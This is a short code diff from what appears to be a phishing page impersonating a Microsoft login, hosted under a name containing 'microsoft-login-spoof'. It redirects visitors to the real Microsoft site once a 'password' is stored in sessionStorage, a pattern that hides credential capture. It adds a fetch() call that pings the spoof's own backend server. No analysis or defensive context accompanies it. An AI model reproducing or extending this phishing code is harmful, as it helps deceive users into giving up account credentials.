@@ -1,6 +1,9 @@
 if (sessionStorage.getItem("password")) {
     window.location.href = "https://www.microsoft.com/";
 }
+fetch('https://microsoft-login-spoof.onrender.com/ping').then(response => {
+    console.log('response', response);
+})
 
 const slidePage = document.querySelector(".slide-page");
 const secondSlide = document.querySelector(".secondSlide");
